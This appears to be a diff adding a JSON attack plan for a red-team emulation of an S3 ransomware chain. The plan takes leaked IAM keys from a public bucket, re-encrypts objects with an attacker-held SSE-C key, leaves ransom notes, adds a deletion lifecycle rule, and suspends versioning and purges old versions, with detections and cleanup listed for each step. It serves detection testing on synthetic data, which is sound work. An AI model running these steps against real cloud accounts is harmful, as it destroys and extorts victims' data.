@@ -1,0 +1,590 @@
+{
+  "status": "PHASE_3_COMPLETE",
+  "attack_chain": [
+    {
+      "step": 1,
+      "phase": 1,
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts",
+      "tactic": "Initial Access",
+      "execution_context": "api_attack",
+      "target_resource": "codefinger-bait-public-bucket",
+      "description": "Retrieve exposed IAM credentials from the publicly accessible bait S3 bucket. The terraform.tfvars file containing the victim access key ID and secret is downloaded anonymously via a public bucket policy, simulating a Codefinger-style actor scanning misconfigured IaC state buckets for harvested IAM keys (T1552.001 discovery vector executed pre-authentication).",
+      "implementation": {
+        "method": "Anonymous boto3 S3 client (no credentials) performs GetObject on the bait bucket to retrieve the exposed credential file",
+        "sdk": "boto3",
+        "api_calls": [
+          {
+            "service": "s3",
+            "method": "get_object",
+            "args": {
+              "Bucket": "codefinger-bait-public-bucket",
+              "Key": "terraform.tfvars"
+            },
+            "note": "Executed without AWS credentials \u2014 codefinger-bait-public-bucket-policy allows anonymous s3:GetObject on this key only"
+          }
+        ],
+        "post_processing": "Parse returned file body for aws_access_key_id and aws_secret_access_key; store as stolen_key_id and stolen_secret for boto3 session construction in step 2"
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "GetObject",
+          "eventSource": "s3.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "S3 Server Access Logs",
+        "CloudTrail S3 data-plane events on bait bucket"
+      ],
+      "cleanup_actions": [
+        "Read-only retrieval of existing object \u2014 no resources created"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          2,
+          5
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "Anonymous GetObject request to bait bucket from external IP",
+        "boto3 user-agent string with no AWS credential signature"
+      ]
+    },
+    {
+      "step": 2,
+      "phase": 1,
+      "technique_id": "T1078.004",
+      "technique_name": "Valid Accounts: Cloud Accounts",
+      "tactic": "Initial Access",
+      "execution_context": "api_attack",
+      "target_resource": "codefinger-victim-iam-access-key",
+      "description": "Construct a boto3 session using the stolen long-term IAM access key and secret recovered in step 1. Validate the stolen credentials via GetCallerIdentity, then survey all accessible S3 buckets via ListBuckets to identify the target \u2014 replicating Codefinger's initial authentication and environment reconnaissance posture.",
+      "implementation": {
+        "method": "boto3.Session constructed with stolen_key_id and stolen_secret; STS and S3 API calls confirm identity and enumerate bucket targets",
+        "sdk": "boto3",
+        "credential_source": "phase_1_iam_key",
+        "api_calls": [
+          {
+            "service": "sts",
+            "method": "get_caller_identity",
+            "args": {}
+          },
+          {
+            "service": "s3",
+            "method": "list_buckets",
+            "args": {}
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "GetCallerIdentity",
+          "eventSource": "sts.amazonaws.com"
+        },
+        {
+          "eventName": "ListBuckets",
+          "eventSource": "s3.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail management events",
+        "GuardDuty UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
+        "GuardDuty Discovery:IAMUser/AnomalousBehavior"
+      ],
+      "cleanup_actions": [
+        "boto3 session terminates on script exit \u2014 no resources created"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          1,
+          4
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "API calls originating from novel source IP using long-term IAM key",
+        "GetCallerIdentity probe \u2014 high-fidelity attacker reconnaissance signal",
+        "ListBuckets from IP outside expected access baseline"
+      ]
+    },
+    {
+      "step": 3,
+      "phase": 2,
+      "technique_id": "T1530",
+      "technique_name": "Data from Cloud Storage",
+      "tactic": "Collection",
+      "execution_context": "api_attack",
+      "target_resource": "codefinger-target-s3-bucket",
+      "description": "Enumerate all objects in the target bucket across the finance/ and hr/ prefixes using paginated ListObjectsV2. HeadObject calls collect per-object metadata (size, ETag, storage class) to plan the encryption loop. A sample GetObject per prefix confirms read access to actual data content before committing to the encryption phase.",
+      "implementation": {
+        "method": "Paginated ListObjectsV2 across full bucket; HeadObject on each discovered key; GetObject on one representative key per prefix to verify data access",
+        "sdk": "boto3",
+        "credential_source": "phase_1_iam_key",
+        "api_calls": [
+          {
+            "service": "s3",
+            "method": "list_objects_v2",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket"
+            },
+            "note": "Paginate with continuation token until all keys collected; build object_manifest list for encryption loop"
+          },
+          {
+            "service": "s3",
+            "method": "head_object",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "Key": "<each discovered key>"
+            },
+            "note": "Collect ContentLength, ETag, ServerSideEncryption state; repeat per object"
+          },
+          {
+            "service": "s3",
+            "method": "get_object",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "Key": "<sample key per prefix>"
+            },
+            "note": "Confirms data-plane read access; object body used in step 4 re-upload \u2014 content not exfiltrated"
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "ListObjects",
+          "eventSource": "s3.amazonaws.com"
+        },
+        {
+          "eventName": "HeadObject",
+          "eventSource": "s3.amazonaws.com"
+        },
+        {
+          "eventName": "GetObject",
+          "eventSource": "s3.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail S3 data-plane events",
+        "GuardDuty Discovery:S3/MaliciousIPCaller",
+        "Macie automated data discovery findings"
+      ],
+      "cleanup_actions": [
+        "Read-only enumeration \u2014 no resources created"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          1,
+          3
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "High-volume ListObjects + HeadObject calls from non-native source IP",
+        "GetObject access spanning multiple prefixes in rapid succession",
+        "Unusual principal (victim IAM user) accessing data-plane APIs outside business hours"
+      ]
+    },
+    {
+      "step": 4,
+      "phase": 3,
+      "technique_id": "T1486",
+      "technique_name": "Data Encrypted for Impact",
+      "tactic": "Impact",
+      "execution_context": "api_attack",
+      "target_resource": "codefinger-target-s3-bucket",
+      "description": "SIMULATED: Generate a local AES-256 SSE-C key (the attacker-held key Codefinger uses to hold data hostage). For each synthetic object collected in step 3, retrieve the plaintext body then re-upload it to the same S3 key with SSE-C headers \u2014 replacing the plaintext object with an attacker-encrypted copy. CloudTrail logs the HMAC of the SSE-C key but never the key material itself. Deposit a ransom note (README.txt) in each affected prefix (finance/, hr/).",
+      "implementation": {
+        "method": "os.urandom(32) generates the AES-256 SSE-C key locally; GetObject retrieves plaintext body; PutObject re-uploads with SSECustomerAlgorithm/SSECustomerKey/SSECustomerKeyMD5; separate PutObject drops ransom note per prefix",
+        "sdk": "boto3",
+        "credential_source": "phase_1_iam_key",
+        "pre_step": "import os, base64, hashlib; aes_key = os.urandom(32); aes_key_b64 = base64.b64encode(aes_key).decode(); aes_key_md5 = base64.b64encode(hashlib.md5(aes_key).digest()).decode(); save aes_key to local file for cleanup",
+        "api_calls": [
+          {
+            "service": "s3",
+            "method": "get_object",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "Key": "<original key>"
+            },
+            "note": "Retrieve plaintext body; repeat per object in object_manifest"
+          },
+          {
+            "service": "s3",
+            "method": "put_object",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "Key": "<original key>",
+              "Body": "<plaintext body>",
+              "SSECustomerAlgorithm": "AES256",
+              "SSECustomerKey": "<aes_key_b64>",
+              "SSECustomerKeyMD5": "<aes_key_md5>"
+            },
+            "note": "Overwrites original with SSE-C encrypted copy; CloudTrail logs HMAC only \u2014 attacker retains sole decryption capability; repeat per object"
+          },
+          {
+            "service": "s3",
+            "method": "put_object",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "Key": "finance/README.txt",
+              "Body": "Your files have been encrypted with a key only we possess. Send payment to [Bitcoin address] within 7 days or your data will be permanently deleted. Contact: codefinger@proton.me",
+              "ContentType": "text/plain"
+            }
+          },
+          {
+            "service": "s3",
+            "method": "put_object",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "Key": "hr/README.txt",
+              "Body": "Your files have been encrypted with a key only we possess. Send payment to [Bitcoin address] within 7 days or your data will be permanently deleted. Contact: codefinger@proton.me",
+              "ContentType": "text/plain"
+            }
+          }
+        ],
+        "simulation_note": "All objects are synthetic test data generated by Pulumi. The AES-256 SSE-C key is written to local disk immediately for use in cleanup. No production data is involved."
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "PutObject",
+          "eventSource": "s3.amazonaws.com"
+        },
+        {
+          "eventName": "GetObject",
+          "eventSource": "s3.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail S3 data-plane events (SSE-C PutObject \u2014 x-amz-server-side-encryption-customer-algorithm header logged)",
+        "GuardDuty Impact:S3/MaliciousIPCaller.Custom",
+        "Macie policy findings on encryption-state change"
+      ],
+      "cleanup_actions": [
+        "SSE-C encrypted objects deleted in step 5 cleanup path",
+        "README.txt ransom notes deleted in cleanup_manifest after pulumi destroy"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          1,
+          3
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "PutObject calls with SSE-C headers on objects that previously had no customer-managed encryption",
+        "In-place overwrite pattern: PutObject to existing keys at high volume in short window",
+        "README.txt objects appearing in multiple prefixes simultaneously",
+        "CloudTrail SSE-C HMAC entries \u2014 attacker key fingerprint"
+      ]
+    },
+    {
+      "step": 5,
+      "phase": 4,
+      "technique_id": "T1485",
+      "technique_name": "Data Destruction",
+      "tactic": "Impact",
+      "execution_context": "api_attack",
+      "target_resource": "codefinger-target-s3-bucket",
+      "description": "SIMULATED: Delete the original plaintext objects (now overwritten with SSE-C copies). Set a lifecycle deletion policy on the bucket with a 1-day expiry (simulating Codefinger's 7-day TTL \u2014 shortened per operational_notes for safe emulation). The lifecycle rule is immediately removed via DeleteBucketLifecycle after CloudTrail captures the PutBucketLifecycleConfiguration event, preventing actual automated deletion of the synthetic test objects.",
+      "implementation": {
+        "method": "DeleteObject per original key (already SSE-C overwritten \u2014 deletion removes the last plaintext restore path); PutBucketLifecycleConfiguration sets auto-delete rule; DeleteBucketLifecycle removes it immediately after log capture",
+        "sdk": "boto3",
+        "credential_source": "phase_1_iam_key",
+        "api_calls": [
+          {
+            "service": "s3",
+            "method": "delete_object",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "Key": "<each original key>"
+            },
+            "note": "Objects were overwritten with SSE-C copies in step 4; DeleteObject removes any unversioned delete markers and ensures original content is not recoverable without attacker key; repeat per object in object_manifest"
+          },
+          {
+            "service": "s3",
+            "method": "put_bucket_lifecycle_configuration",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "LifecycleConfiguration": {
+                "Rules": [
+                  {
+                    "ID": "codefinger-auto-delete",
+                    "Status": "Enabled",
+                    "Filter": {
+                      "Prefix": ""
+                    },
+                    "Expiration": {
+                      "Days": 1
+                    }
+                  }
+                ]
+              }
+            }
+          },
+          {
+            "service": "s3",
+            "method": "delete_bucket_lifecycle",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket"
+            },
+            "note": "Removes lifecycle rule immediately after CloudTrail captures PutBucketLifecycleConfiguration \u2014 prevents automated deletion of synthetic test data"
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "DeleteObject",
+          "eventSource": "s3.amazonaws.com"
+        },
+        {
+          "eventName": "PutBucketLifecycleConfiguration",
+          "eventSource": "s3.amazonaws.com"
+        },
+        {
+          "eventName": "DeleteBucketLifecycle",
+          "eventSource": "s3.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail management events (PutBucketLifecycleConfiguration \u2014 high-signal control-plane change)",
+        "CloudTrail data-plane events (DeleteObject volume spike)",
+        "GuardDuty Impact:S3/PermissionsModification.Unusual",
+        "Security Hub S3.13 (lifecycle policy modification)"
+      ],
+      "cleanup_actions": [
+        "Lifecycle rule deleted in-step immediately after CloudTrail capture \u2014 no residual policy",
+        "SSE-C encrypted objects remain and are cleaned in cleanup_manifest"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          2,
+          5
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "PutBucketLifecycleConfiguration with 1-day expiry applied to a bucket with no prior lifecycle policy",
+        "Bulk DeleteObject API calls immediately following high-volume PutObject (SSE-C) activity in same session",
+        "Lifecycle rule ID 'codefinger-auto-delete' matching known threat actor naming pattern"
+      ]
+    },
+    {
+      "step": 6,
+      "phase": 5,
+      "technique_id": "T1490",
+      "technique_name": "Inhibit System Recovery",
+      "tactic": "Impact",
+      "execution_context": "api_attack",
+      "target_resource": "codefinger-target-s3-bucket",
+      "description": "Suspend S3 object versioning on the target bucket to eliminate version-rollback as an incident response path. Enumerate all existing object versions and delete markers using ListObjectVersions, then bulk-delete them via DeleteObjects with VersionId \u2014 permanently foreclosing restoration from prior unencrypted versions. This is the terminal technique in Codefinger's kill chain, completing the ransomware scenario by removing the most common AWS recovery mechanism.",
+      "implementation": {
+        "method": "GetBucketVersioning reads current state; PutBucketVersioning suspends versioning; paginated ListObjectVersions collects all VersionIds and DeleteMarkers; DeleteObjects batch-deletes all version entries",
+        "sdk": "boto3",
+        "credential_source": "phase_1_iam_key",
+        "api_calls": [
+          {
+            "service": "s3",
+            "method": "get_bucket_versioning",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket"
+            },
+            "note": "Log current versioning state before modification for cleanup fidelity"
+          },
+          {
+            "service": "s3",
+            "method": "put_bucket_versioning",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "VersioningConfiguration": {
+                "Status": "Suspended"
+              }
+            }
+          },
+          {
+            "service": "s3",
+            "method": "list_object_versions",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket"
+            },
+            "note": "Paginate to collect all VersionId values for both versions and delete markers"
+          },
+          {
+            "service": "s3",
+            "method": "delete_objects",
+            "args": {
+              "Bucket": "codefinger-target-s3-bucket",
+              "Delete": {
+                "Objects": [
+                  {
+                    "Key": "<key>",
+                    "VersionId": "<version_id>"
+                  }
+                ],
+                "Quiet": true
+              }
+            },
+            "note": "Batch up to 1000 version entries per call; repeat for delete markers; eliminates all restore points"
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "PutBucketVersioning",
+          "eventSource": "s3.amazonaws.com"
+        },
+        {
+          "eventName": "ListObjectVersions",
+          "eventSource": "s3.amazonaws.com"
+        },
+        {
+          "eventName": "DeleteObjectVersion",
+          "eventSource": "s3.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "CloudTrail management events (PutBucketVersioning \u2014 disabling versioning is a critical high-fidelity detection signal)",
+        "GuardDuty Impact:S3/MaliciousIPCaller.Custom",
+        "Security Hub S3.14 control (versioning disabled alert)",
+        "EventBridge rule on PutBucketVersioning for automated response"
+      ],
+      "cleanup_actions": [
+        "Re-enable versioning via PutBucketVersioning Status=Enabled before pulumi destroy (listed in cleanup_manifest)"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          2,
+          6
+        ]
+      },
+      "risk_level": "high",
+      "iocs_generated": [
+        "PutBucketVersioning transitioning bucket from Enabled to Suspended immediately following encryption activity",
+        "Bulk DeleteObjectVersion calls on a previously versioned bucket",
+        "Complete kill chain signature: SSE-C PutObject + DeleteObject + PutBucketLifecycleConfiguration + PutBucketVersioning + DeleteObjectVersion in single IAM session"
+      ]
+    }
+  ],
+  "credential_chain": [
+    {
+      "id": "phase_1_iam_key",
+      "phase": 1,
+      "source": "codefinger-exposed-credentials-object in codefinger-bait-public-bucket \u2014 terraform.tfvars file retrieved anonymously via public s3:GetObject, containing victim IAM access key ID and secret (simulates T1552.001 discovery of credentials committed to publicly accessible IaC state storage)",
+      "technique": "T1078.004",
+      "type": "AWS IAM Access Key (long-term)",
+      "session_name": "stolen_boto3_session",
+      "used_in_phases": [
+        1,
+        2,
+        3,
+        4,
+        5
+      ],
+      "expiration": "Manual rotation required \u2014 no automatic expiry on long-term IAM access keys"
+    }
+  ],
+  "script_manifest": {
+    "attack_script": "attack.py",
+    "description": "Single unified attack script implementing the full Codefinger ransomware kill chain. Reads victim IAM credentials from the public bait bucket anonymously, constructs one persistent boto3 session, and executes all five MITRE techniques in sequence: credential validation (T1078.004), data enumeration (T1530), SSE-C re-encryption simulation (T1486), lifecycle-and-deletion simulation (T1485), and versioning suspension with version purge (T1490). The AES-256 SSE-C key is generated at runtime and written to disk for cleanup use.",
+    "entry_point": "main(target_info)",
+    "phases": [
+      {
+        "phase": 1,
+        "name": "Initial Access \u2014 Credential Harvesting and Validation",
+        "techniques": [
+          "T1078.004"
+        ],
+        "context": "api_attack"
+      },
+      {
+        "phase": 2,
+        "name": "Collection \u2014 Target S3 Object Enumeration",
+        "techniques": [
+          "T1530"
+        ],
+        "context": "api_attack"
+      },
+      {
+        "phase": 3,
+        "name": "Impact \u2014 SSE-C Encryption (Simulated)",
+        "techniques": [
+          "T1486"
+        ],
+        "context": "api_attack"
+      },
+      {
+        "phase": 4,
+        "name": "Impact \u2014 Data Destruction (Simulated)",
+        "techniques": [
+          "T1485"
+        ],
+        "context": "api_attack"
+      },
+      {
+        "phase": 5,
+        "name": "Impact \u2014 Recovery Inhibition",
+        "techniques": [
+          "T1490"
+        ],
+        "context": "api_attack"
+      }
+    ]
+  },
+  "cleanup_manifest": {
+    "attack_created_resources": [
+      {
+        "type": "S3 lifecycle configuration",
+        "name": "codefinger-auto-delete rule on codefinger-target-s3-bucket",
+        "cleaned_during_attack": true
+      },
+      {
+        "type": "S3 object",
+        "name": "finance/README.txt ransom note in codefinger-target-s3-bucket",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "S3 object",
+        "name": "hr/README.txt ransom note in codefinger-target-s3-bucket",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "S3 objects (SSE-C encrypted)",
+        "name": "All re-uploaded synthetic objects in codefinger-target-s3-bucket encrypted with attacker AES-256 SSE-C key",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "S3 bucket versioning state",
+        "name": "codefinger-target-s3-bucket versioning Suspended (was Enabled)",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "Local file",
+        "name": "ssec_key.bin \u2014 AES-256 SSE-C key written to attack host disk",
+        "cleaned_during_attack": false
+      }
+    ],
+    "pulumi_managed_resources": "All infrastructure destroyed by pulumi destroy \u2014 includes both S3 buckets, IAM user/key/policy, CloudTrail trail and log bucket",
+    "cleanup_order": [
+      "Re-enable S3 versioning on codefinger-target-s3-bucket: PutBucketVersioning Status=Enabled",
+      "Delete SSE-C encrypted synthetic objects in codefinger-target-s3-bucket \u2014 objects cannot be read back without ssec_key.bin but can be deleted without the key via DeleteObject",
+      "Delete ransom note objects: finance/README.txt and hr/README.txt from codefinger-target-s3-bucket",
+      "Verify lifecycle configuration is absent on codefinger-target-s3-bucket (deleted in-step during T1485)",
+      "Securely delete local ssec_key.bin from attack host",
+      "pulumi destroy"
+    ]
+  },
+  "dwell_time_recommendation_seconds": 600,
+  "total_techniques": 5,
+  "total_attack_steps": 6,
+  "mitre_tactics_covered": [
+    "Initial Access",
+    "Collection",
+    "Impact"
+  ]
+}
